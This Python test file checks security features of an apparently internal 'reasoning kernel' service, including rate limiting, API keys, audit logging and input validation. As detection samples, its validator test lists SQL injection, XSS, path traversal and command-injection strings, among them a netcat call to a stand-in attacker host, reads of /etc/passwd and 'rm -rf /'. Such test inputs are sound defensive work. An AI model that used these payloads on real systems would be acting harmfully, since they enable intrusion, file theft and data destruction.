"""
Security Hardening Integration Test for MSA Reasoning Kernel

Tests comprehensive security hardening implementation:
- Rate limiting middleware
- API key management
- Request validation
- Audit logging
- Security headers
"""

import pytest
import asyncio
import time
from fastapi import FastAPI
from fastapi.testclient import TestClient

from reasoning_kernel.security.security_manager import SecurityManager, SecurityConfig
from reasoning_kernel.security.api_key_manager import APIKeyManager, UserRole, APIKeyPermissions
from reasoning_kernel.security.audit_logging import AuditLogger, AuditEventType
from reasoning_kernel.security.request_validation import SecurityValidator
from reasoning_kernel.middleware.rate_limiting import SlidingWindowCounter


class TestSecurityHardening:
    """Comprehensive security hardening tests"""

    @pytest.fixture
    def security_config(self):
        """Create test security configuration"""
        return SecurityConfig(
            environment="test",
            debug_mode=True,
            force_https=False,
            rate_limiting_enabled=True,
            request_validation_enabled=True,
            audit_logging_enabled=True,
            api_key_enabled=True,
            validation_level="strict",
        )

    @pytest.fixture
    async def security_manager(self, security_config):
        """Create and initialize security manager"""
        manager = SecurityManager(security_config)
        await manager.initialize()
        return manager

    @pytest.fixture
    async def api_key_manager(self):
        """Create API key manager for testing"""
        manager = APIKeyManager("redis://localhost:6379/1")
        await manager.initialize()
        return manager

    @pytest.fixture
    async def audit_logger(self):
        """Create audit logger for testing"""
        logger = AuditLogger(redis_url="redis://localhost:6379/2", file_path="test_audit.jsonl")
        await logger.initialize()
        return logger

    def test_sliding_window_rate_limiter(self):
        """Test sliding window rate limiting"""
        limiter = SlidingWindowCounter(window_size_minutes=1)
        current_time = time.time()

        # Test normal operation
        allowed, info = limiter.is_allowed("test_client", 5, current_time)
        assert allowed
        assert info["allowed"] is True
        assert info["current_count"] == 1
        assert info["remaining"] == 4

        # Fill up the limit
        for i in range(4):
            allowed, _ = limiter.is_allowed("test_client", 5, current_time)
            assert allowed

        # Should now be blocked
        allowed, info = limiter.is_allowed("test_client", 5, current_time)
        assert not allowed
        assert info["allowed"] is False
        assert info["reason"] == "rate_limit_exceeded"

        # Should be blocked for 15 minutes
        assert "blocked_until" in info
        assert info["retry_after_seconds"] == 15 * 60

        # Test window sliding
        future_time = current_time + 61  # Move past window
        allowed, info = limiter.is_allowed("test_client", 5, future_time)
        assert allowed  # Should work again after window

    @pytest.mark.asyncio
    async def test_api_key_creation_and_validation(self, api_key_manager):
        """Test API key creation and validation"""

        # Create admin permissions
        admin_permissions = APIKeyPermissions(
            can_access_admin=True, can_read=True, can_write=True, can_delete=True, max_concurrent_requests=50
        )

        # Create API key
        api_key, metadata = await api_key_manager.create_api_key(
            name="Test Admin Key",
            description="Test key for security tests",
            user_role=UserRole.ADMIN,
            permissions=admin_permissions,
            expires_in_days=30,
        )

        # Verify key format
        assert api_key.startswith("rk_")
        assert len(api_key) > 20

        # Test validation
        is_valid, validated_metadata, error = await api_key_manager.validate_api_key(api_key)
        assert is_valid
        assert error is None
        assert validated_metadata is not None
        assert validated_metadata.name == "Test Admin Key"
        assert validated_metadata.user_role == UserRole.ADMIN

        # Test invalid key
        is_valid, _, error = await api_key_manager.validate_api_key("invalid_key")
        assert not is_valid
        assert "Invalid API key format" in error

        # Test non-existent key
        fake_key = "rk_" + "x" * 24
        is_valid, _, error = await api_key_manager.validate_api_key(fake_key)
        assert not is_valid
        assert "API key not found" in error

    def test_security_validator(self):
        """Test security input validation"""

        # Test SQL injection detection
        sql_attacks = [
            "'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "1; DELETE FROM accounts; --",
        ]

        for attack in sql_attacks:
            violations = SecurityValidator.check_sql_injection(attack)
            assert len(violations) > 0, f"Should detect SQL injection in: {attack}"

        # Test XSS detection
        xss_attacks = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]

        for attack in xss_attacks:
            violations = SecurityValidator.check_xss(attack)
            assert len(violations) > 0, f"Should detect XSS in: {attack}"

        # Test path traversal detection
        path_attacks = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
        ]

        for attack in path_attacks:
            violations = SecurityValidator.check_path_traversal(attack)
            assert len(violations) > 0, f"Should detect path traversal in: {attack}"

        # Test command injection detection
        command_attacks = ["; cat /etc/passwd", "| nc attacker.com 4444", "$(whoami)", "`rm -rf /`"]

        for attack in command_attacks:
            violations = SecurityValidator.check_command_injection(attack)
            assert len(violations) > 0, f"Should detect command injection in: {attack}"

        # Test safe inputs
        safe_inputs = [
            "normal text input",
            "user@example.com",
            "Product description with numbers 123",
            "Simple query with spaces",
        ]

        for safe_input in safe_inputs:
            assert len(SecurityValidator.check_sql_injection(safe_input)) == 0
            assert len(SecurityValidator.check_xss(safe_input)) == 0
            assert len(SecurityValidator.check_path_traversal(safe_input)) == 0
            assert len(SecurityValidator.check_command_injection(safe_input)) == 0

    @pytest.mark.asyncio
    async def test_audit_logging(self, audit_logger):
        """Test audit logging functionality"""

        from reasoning_kernel.security.audit_logging import AuditEvent, AuditSeverity

        # Create test event
        event = AuditEvent(
            event_type=AuditEventType.AUTH_SUCCESS,
            severity=AuditSeverity.LOW,
            user_id="test_user",
            client_ip="192.168.1.100",
            message="Test authentication success",
            details={"test": "data"},
        )

        # Log the event
        await audit_logger.log_event(event)

        # Verify event can be retrieved
        events = await audit_logger.search_events(event_types=[AuditEventType.AUTH_SUCCESS], limit=10)

        assert len(events) > 0
        found_event = events[0]
        assert found_event.user_id == "test_user"
        assert found_event.client_ip == "192.168.1.100"
        assert found_event.message == "Test authentication success"

        # Test event filtering
        security_events = await audit_logger.search_events(event_types=[AuditEventType.SECURITY_VIOLATION], limit=10)

        # Should not contain our auth success event
        auth_events_in_security = [e for e in security_events if e.event_type == AuditEventType.AUTH_SUCCESS]
        assert len(auth_events_in_security) == 0

    def test_fastapi_security_integration(self, security_config):
        """Test FastAPI security integration"""

        # Create test app
        app = FastAPI()

        @app.get("/test")
        async def test_endpoint():
            return {"message": "test"}

        @app.get("/admin/test")
        async def admin_endpoint():
            return {"message": "admin"}

        # Configure security
        security_manager = SecurityManager(security_config)
        security_manager.configure_app(app)

        client = TestClient(app)

        # Test security headers are added
        response = client.get("/test")
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        assert "X-Frame-Options" in response.headers
        assert response.headers["X-Frame-Options"] == "DENY"

        # Test request size validation
        large_payload = {"data": "x" * 50000000}  # 50MB
        response = client.post("/test", json=large_payload)
        assert response.status_code in [400, 413, 422]  # Should be rejected

    def test_permission_checking(self):
        """Test API key permission checking"""

        # Create limited permissions
        limited_permissions = APIKeyPermissions(
            can_access_reasoning=True, can_access_admin=False, can_read=True, can_write=False, can_delete=False
        )

        # Test admin endpoint access (should fail)
        allowed, message = asyncio.run(self._check_permission_async(limited_permissions, "/admin/users", "GET"))
        assert not allowed
        assert "admin access denied" in message.lower()

        # Test write operation (should fail)
        allowed, message = asyncio.run(self._check_permission_async(limited_permissions, "/api/data", "POST"))
        assert not allowed
        assert "write access denied" in message.lower()

        # Test read operation (should succeed)
        allowed, message = asyncio.run(self._check_permission_async(limited_permissions, "/api/data", "GET"))
        assert allowed
        assert "access granted" in message.lower()

    async def _check_permission_async(self, permissions, endpoint, method):
        """Helper method to check permissions asynchronously"""
        from reasoning_kernel.security.api_key_manager import APIKeyMetadata

        # Create mock metadata
        metadata = APIKeyMetadata(key_id="test_key", key_hash="test_hash", name="Test Key", permissions=permissions)

        # Use APIKeyManager's check_permission method
        manager = APIKeyManager()
        return await manager.check_permission(metadata, endpoint, method)

    def test_input_sanitization(self):
        """Test input sanitization utilities"""

        from reasoning_kernel.security.request_validation import InputSanitizer

        # Test HTML sanitization
        malicious_html = "<script>alert('xss')</script><p>Safe content</p>"
        sanitized = InputSanitizer.sanitize_for_display(malicious_html)
        assert "<script>" not in sanitized
        assert "Safe content" in sanitized

        # Test data structure sanitization
        malicious_data = {
            "name": "<script>alert('xss')</script>John",
            "description": "Normal text",
            "items": ["<img onerror='alert(1)' src='x'>", "Safe item"],
        }

        sanitized_data = InputSanitizer.sanitize_for_storage(malicious_data)
        assert "<script>" not in sanitized_data["name"]
        assert "John" in sanitized_data["name"]
        assert sanitized_data["description"] == "Normal text"
        assert "<img" not in sanitized_data["items"][0]
        assert sanitized_data["items"][1] == "Safe item"

    @pytest.mark.asyncio
    async def test_concurrent_request_limits(self, api_key_manager):
        """Test concurrent request limiting"""

        # Create API key with low concurrent limit
        permissions = APIKeyPermissions(max_concurrent_requests=2)

        api_key, metadata = await api_key_manager.create_api_key(name="Concurrent Test Key", permissions=permissions)

        # First request should be allowed
        allowed1, _, _ = await api_key_manager.validate_api_key(api_key)
        assert allowed1

        # Second request should be allowed
        allowed2, _, _ = await api_key_manager.validate_api_key(api_key)
        assert allowed2

        # Third request should be blocked
        allowed3, _, error = await api_key_manager.validate_api_key(api_key)
        assert not allowed3
        assert "concurrent request limit exceeded" in error.lower()

        # Release one request
        api_key_manager.release_request(api_key)

        # Now should be allowed again
        allowed4, _, _ = await api_key_manager.validate_api_key(api_key)
        assert allowed4

    def test_security_config_from_env(self, monkeypatch):
        """Test security configuration from environment variables"""

        # Set environment variables
        monkeypatch.setenv("ENVIRONMENT", "production")
        monkeypatch.setenv("API_KEY_ENABLED", "true")
        monkeypatch.setenv("RATE_LIMITING_ENABLED", "false")
        monkeypatch.setenv("FORCE_HTTPS", "true")
        monkeypatch.setenv("CORS_ALLOW_ORIGINS", "https://example.com,https://app.com")

        config = SecurityConfig.from_env()

        assert config.environment == "production"
        assert config.api_key_enabled is True
        assert config.rate_limiting_enabled is False
        assert config.force_https is True
        assert "https://example.com" in config.cors_allow_origins
        assert "https://app.com" in config.cors_allow_origins

    def test_comprehensive_security_status(self, security_config):
        """Test comprehensive security status reporting"""

        security_manager = SecurityManager(security_config)
        status = security_manager.get_security_status()

        assert "environment" in status
        assert "security_features" in status
        assert status["security_features"]["api_key_enabled"] is True
        assert status["security_features"]["rate_limiting_enabled"] is True
        assert status["security_features"]["request_validation_enabled"] is True
        assert status["validation_level"] == "strict"
        assert "/health" in status["public_endpoints"]
        assert "/admin" in status["admin_endpoints"]


def test_security_integration_performance():
    """Test that security features don't significantly impact performance"""
    import time
    from reasoning_kernel.security.request_validation import SecurityValidator

    # Test input validation performance
    test_input = "Normal user input with some text and numbers 123"
    iterations = 1000

    start_time = time.time()
    for _ in range(iterations):
        SecurityValidator.check_sql_injection(test_input)
        SecurityValidator.check_xss(test_input)
        SecurityValidator.check_path_traversal(test_input)
    end_time = time.time()

    avg_time_per_validation = (end_time - start_time) / iterations

    # Should be very fast (less than 1ms per validation)
    assert avg_time_per_validation < 0.001, f"Validation too slow: {avg_time_per_validation}s per validation"


if __name__ == "__main__":
    pytest.main([__file__])
